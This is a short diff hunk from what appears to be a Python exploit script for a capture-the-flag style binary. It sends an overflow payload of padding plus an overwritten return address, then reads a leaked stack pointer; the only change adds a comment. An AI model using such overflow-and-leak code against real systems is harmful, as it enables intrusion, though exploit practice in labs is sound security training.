@@ -10,6 +10,7 @@ payload = b"AAAABBBBCCCCDDDDEEEE\x87\x80\x04\x08"
 
 server.send(payload)
 
+# get the leaked esp
 s = server.read()[:4]
 
 stack_addr = int.from_bytes(s, byteorder='little')
